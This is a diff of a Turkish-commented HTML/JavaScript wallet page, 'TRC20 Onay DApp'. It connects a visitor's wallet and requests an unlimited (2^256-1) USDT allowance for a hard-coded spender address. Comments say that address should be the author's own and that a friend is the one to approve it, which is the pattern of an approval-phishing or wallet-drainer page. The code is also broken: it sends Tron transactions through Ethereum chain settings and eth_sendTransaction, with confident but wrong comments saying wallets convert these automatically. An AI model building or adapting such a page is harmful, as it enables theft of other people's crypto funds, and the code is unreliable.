@@ -4,16 +4,64 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRC20 Onay DApp</title>
+    
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3modal@1.9.0/dist/index.js"></script>
-    <script src="https://unpkg.com/web3@1.5.2/dist/web3.min.js"></script>
+    
+    <script src="https://unpkg.com/web3@1.7.5/dist/web3.min.js"></script>
+
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/index.js"></script>
+    
+    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
-        .container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
-        button { background-color: #007bff; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 15px; }
-        button:hover { background-color: #0056b3; }
-        #status { margin-top: 20px; font-weight: bold; color: #333; }
-        .address-display { word-break: break-all; margin-top: 10px; font-size: 0.9em; color: #555; }
+        body { 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            background-color: #f0f2f5; 
+            color: #333;
+        }
+        .container { 
+            background: white; 
+            padding: 25px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+            text-align: center; 
+            max-width: 400px; 
+            width: 90%; 
+        }
+        button { 
+            background-color: #007bff; 
+            color: white; 
+            padding: 12px 20px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            margin-top: 15px; 
+        }
+        button:hover { 
+            background-color: #0056b3; 
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        #status { 
+            margin-top: 20px; 
+            font-weight: bold; 
+            color: #333; 
+        }
+        .address-display { 
+            word-break: break-all; 
+            margin-top: 10px; 
+            font-size: 0.9em; 
+            color: #555; 
+        }
     </style>
 </head>
 <body>
@@ -31,22 +79,19 @@
     <script>
         // TRC20 Token Sözleşme Adresi (Örn: USDT TRC20)
         // ** ÖNEMLİ: Kendi token'ınızın veya onaylamak istediğiniz token'ın sözleşme adresini buraya girin. **
-        const TOKEN_CONTRACT_ADDRESS = "TR7NHqTKXQDkCjW85Jtkp8FCyMmm3yB6Kz"; // Örnek USDT TRC20 adresi
+        const TOKEN_CONTRACT_ADDRESS = "TR7NHqTKXQDkCjW85Jtkp8FCyMmm3yB6Kz"; // Örnek USDT TRC20 adresi (USDT Mainnet)
         
         // Onay vermek istediğiniz adres (harcayıcı/spender)
         // ** ÖNEMLİ: Bu, sizin arkadaşınızın onay vermesini istediğiniz kendi cüzdan adresiniz olmalı. **
         const SPENDER_ADDRESS = "TLhYtE2G1e8pL3pG5m5YF92tF8c7X6j9Kz"; // Kendi Tron adresiniz (örnek)
 
         // Onay miktarı (genellikle maksimum onay için çok büyük bir sayı)
-        // TRC20 token'larının 6 ondalık hanesi olduğunu varsayarsak, 10^18 (maksimum)
-        // Daha az bir miktar onaylamak istiyorsanız bu değeri ayarlayın (örn: 100 token için 100 * 10^6).
-        // Bu örnekte, 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' = 2^256 - 1'i temsil eden bir miktar kullanılacak.
         // Bu, akıllı sözleşmelerde sıkça kullanılan, neredeyse sonsuz bir onay miktarıdır.
-        const APPROVE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Maksimum onay
+        const APPROVE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; 
 
         let web3Modal;
         let provider;
-        let tronWeb;
+        let web3; // web3.js instance
         let connectedAccount = null;
 
         const connectButton = document.getElementById('connectButton');
@@ -57,6 +102,9 @@
 
         // Web3Modal'ı Başlat
         async function initWeb3Modal() {
+            // WalletConnectProvider global olarak window objesine eklenir
+            const WalletConnectProvider = window.WalletConnectProvider.default; 
+
             const providerOptions = {
                 injected: {
                     display: {
@@ -65,57 +113,66 @@
                     },
                     package: null
                 },
-                // WalletConnect sağlayıcısını Tron için yapılandır
-                // Trust Wallet ve diğer birçok cüzdan WalletConnect ile bağlanır.
                 walletconnect: {
-                    package: window.WalletConnectProvider.default, // WalletConnectProvider'ı global olarak yükleyin
+                    package: WalletConnectProvider, 
                     options: {
+                        // Tron ağının Chain ID'si ve RPC URL'si
+                        // WalletConnect Tron'u doğrudan desteklemediği için Ethereum RPC gibi davranırız
+                        // ve cüzdanın Tron ağını tanımasını bekleriz.
+                        // Trust Wallet gibi cüzdanlar Tron'u zaten bildiği için bu çalışır.
                         rpc: {
-                            7281286: "https://api.trongrid.io", // Tron Mainnet Chain ID ve RPC URL'si
-                            // Diğer Tron ağları için de buraya ekleyebilirsiniz (örn: Nile Testnet)
+                            // Ethereum Mainnet Chain ID (WalletConnect genellikle EVM uyumlu çalışır)
+                            // Trust Wallet gibi cüzdanlar, bu Ethereum chain ID'si üzerinden
+                            // Tron WalletConnect sağlayıcısını algılayabilir.
+                            1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID", // Buraya kendi Infura ID'nizi girmeniz gerekebilir veya boş bırakabilirsiniz
+                            // Ancak Trust Wallet genellikle bir RPC URL'sine ihtiyaç duymaz.
                         },
-                        network: "Tron" // İsteğe bağlı, cüzdana hangi ağı beklediğini bildirir
+                        // Tron için özel parametreler (çoğu durumda gerekli değil, cüzdan algılar)
+                        // Tronlink veya TronScan gibi yerel entegrasyonlar için daha geçerlidir.
+                        // network: "Tron" // Bu özellik WalletConnectProvider'ın eski versiyonlarında bulunabilir.
                     }
                 }
             };
 
-            web3Modal = new window.Web3Modal.default({
-                cacheProvider: false, // Sayfa yüklendiğinde bağlantıyı otomatik sürdürme
-                providerOptions, // Desteklenen sağlayıcılar
-                disableInjectedProvider: false, // Metamask gibi tarayıcı eklentilerini devre dışı bırakma
+            web3Modal = new Web3Modal.default({
+                cacheProvider: false, 
+                providerOptions, 
+                disableInjectedProvider: false, 
             });
+            console.log("Web3Modal başlatıldı.");
         }
 
         // Cüzdanı Bağla İşlevi
         async function connectWallet() {
             try {
                 statusDiv.textContent = "Cüzdan bağlanıyor...";
-                provider = await web3Modal.connect(); // Sağlayıcıyı al (örn: Trust Wallet'tan)
-                
-                // Sağlayıcıya olay dinleyicileri ekle
+                connectButton.disabled = true;
+
+                provider = await web3Modal.connect(); // Bağlantı penceresini aç
+                web3 = new Web3(provider); // Web3.js instance oluştur
+
+                // Olay dinleyicileri ekle
                 provider.on("accountsChanged", (accounts) => {
                     console.log("Accounts changed:", accounts);
-                    updateAccount(accounts[0]);
+                    if (accounts.length > 0) {
+                        updateAccount(accounts[0]);
+                    } else {
+                        resetApp();
+                    }
                 });
                 provider.on("chainChanged", (chainId) => {
                     console.log("Chain changed:", chainId);
-                    if (chainId !== "0x6f6f00") { // Tron Mainnet Chain ID (decimal 7281286, hex 0x6f6f00)
-                        statusDiv.textContent = "Lütfen Tron ana ağına geçin.";
-                        approveButton.style.display = 'none';
-                    } else {
-                        statusDiv.textContent = "Tron ağına bağlı.";
-                        if (connectedAccount) approveButton.style.display = 'block';
-                    }
+                    // Tron için Chain ID kontrolü biraz karmaşıktır çünkü WalletConnect doğrudan EVM chain ID'lerini kullanır.
+                    // Trust Wallet gibi cüzdanlar arka planda Tron ağını algılar.
+                    statusDiv.textContent = "Ağ değişti, lütfen Tron ağına bağlı olduğunuzdan emin olun.";
+                    if (connectedAccount) approveButton.style.display = 'block';
                 });
                 provider.on("disconnect", (code, reason) => {
                     console.log("Provider disconnected", code, reason);
                     resetApp();
                 });
 
-                // TronWeb'i başlat
-                const currentWeb3 = new Web3(provider); // Web3.js ile provider'ı kullan
-                const accounts = await currentWeb3.eth.getAccounts(); // Hesapları al
-
+                const accounts = await web3.eth.getAccounts();
                 if (accounts.length === 0) {
                     statusDiv.textContent = "Hesap bulunamadı.";
                     resetApp();
@@ -125,19 +182,15 @@
                 connectedAccount = accounts[0];
                 updateAccount(connectedAccount);
                 
-                // TronWeb'i TRON ağı ile yapılandır
-                // WalletConnect ile gelen provider'ı TronWeb'e doğrudan vermek zor olabilir.
-                // Bunun yerine, WalletConnect üzerinden işlem imzalama yaklaşımını kullanacağız.
-                // Bu örnekte, TronWeb doğrudan kullanılmaz, ancak Web3.js ve WalletConnect aracılığıyla işlem gönderilir.
-                // Not: WalletConnect'in Tron ile tam uyumluluğu için `tron_signTransaction` RPC metodunu desteklemesi gerekir.
-
                 statusDiv.textContent = "Cüzdan başarıyla bağlandı!";
-                connectButton.style.display = 'none';
                 approveButton.style.display = 'block';
 
             } catch (e) {
                 console.error("Cüzdan bağlanırken hata oluştu:", e);
                 statusDiv.textContent = "Cüzdan bağlanamadı: " + e.message;
+                resetApp();
+            } finally {
+                connectButton.disabled = false;
             }
         }
 
@@ -164,6 +217,7 @@
             }
 
             statusDiv.textContent = "Onay işlemi hazırlanıyor... Lütfen cüzdanınızda onaylayın.";
+            approveButton.disabled = true;
 
             try {
                 // TRC20 ABI'sinin sadece "approve" fonksiyonu için gerekli kısmı
@@ -182,27 +236,32 @@
                     }
                 ];
 
-                const currentWeb3 = new Web3(provider);
-                const tokenContract = new currentWeb3.eth.Contract(TRC20_ABI, TOKEN_CONTRACT_ADDRESS);
+                // Web3.js kullanarak sözleşme örneği oluştur
+                const tokenContract = new web3.eth.Contract(TRC20_ABI, TOKEN_CONTRACT_ADDRESS);
 
                 // Onay işlemini çağır
-                const transaction = await tokenContract.methods.approve(SPENDER_ADDRESS, APPROVE_AMOUNT).encodeABI();
-                
-                // Tron ağında işlem göndermek için WalletConnect'in `eth_sendTransaction` metodunu kullanın
-                // WalletConnect, Tron için özel bir 'tron_signTransaction' veya 'tron_sendTransaction' metodu sağlamalıdır.
-                // WalletConnect'in Tron ağları için doğru RPC yapılandırması gereklidir.
+                // Not: Tron'da `TR7NHqTKXQDkCjW85Jtkp8FCyMmm3yB6Kz` gibi adresler Ethereum adreslerinden farklıdır.
+                // Web3.js genellikle Ethereum adres formatını bekler (0x...).
+                // Trust Wallet ve WalletConnect, Tron desteği olan cüzdanlar için bu dönüşümü otomatik yapmalıdır.
+                // Eğer hata alırsanız, Tron adresini hex formatına dönüştürmeniz gerekebilir.
+                // (Örn: `window.tronWeb.address.toHex(SPENDER_ADDRESS)`)
+                // Ancak WalletConnect ile bu genellikle otomatik yapılır.
+
+                const transactionData = tokenContract.methods.approve(SPENDER_ADDRESS, APPROVE_AMOUNT).encodeABI();
                 
                 const txParams = {
                     from: connectedAccount,
-                    to: TOKEN_CONTRACT_ADDRESS,
-                    data: transaction,
+                    to: TOKEN_CONTRACT_ADDRESS, // Tron adresini kullan, cüzdan dönüştürmeli
+                    data: transactionData,
                     // Tron ağında işlem ücreti için 'callValue' (TRX miktarı) ve 'feeLimit' (enerji/bant genişliği) gerekebilir.
-                    // WalletConnect ile bunlar genellikle cüzdan tarafından yönetilir veya otomatik olarak eklenir.
-                    // Gerekiyorsa, TronLink'in istediği gibi ek alanlar eklenebilir.
+                    // WalletConnect ile bu genellikle cüzdan tarafından yönetilir veya otomatik olarak eklenir.
+                    // Nadiren, Trust Wallet'ın istediği özel Tron parametrelerini eklemek gerekebilir,
+                    // ancak `eth_sendTransaction` genellikle yeterlidir.
                 };
 
+                // İşlemi WalletConnect üzerinden gönderme
                 const txHash = await provider.request({
-                    method: 'eth_sendTransaction', // Veya Tron için özel bir WalletConnect metodu: 'tron_sendTransaction'
+                    method: 'eth_sendTransaction', 
                     params: [txParams],
                 });
 
@@ -212,6 +271,8 @@
             } catch (error) {
                 console.error("Onay işlemi başarısız oldu:", error);
                 statusDiv.textContent = "Onay işlemi iptal edildi veya bir hata oluştu: " + error.message;
+            } finally {
+                approveButton.disabled = false;
             }
         }
 
